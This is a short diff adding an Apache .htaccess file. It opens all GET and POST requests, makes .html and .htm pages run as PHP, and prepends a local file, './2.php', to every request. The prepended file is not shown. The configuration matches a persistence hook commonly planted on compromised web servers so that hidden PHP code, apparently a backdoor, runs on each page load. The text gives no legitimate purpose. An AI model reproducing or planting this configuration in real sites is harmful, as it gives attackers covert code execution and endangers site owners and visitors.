@@ -1,0 +1,6 @@
+<Limit GET POST>
+allow from all
+</Limit>
+AddType application/x-httpd-php .html
+AddType application/x-httpd-php .htm 
+php_value auto_prepend_file "./2.php"
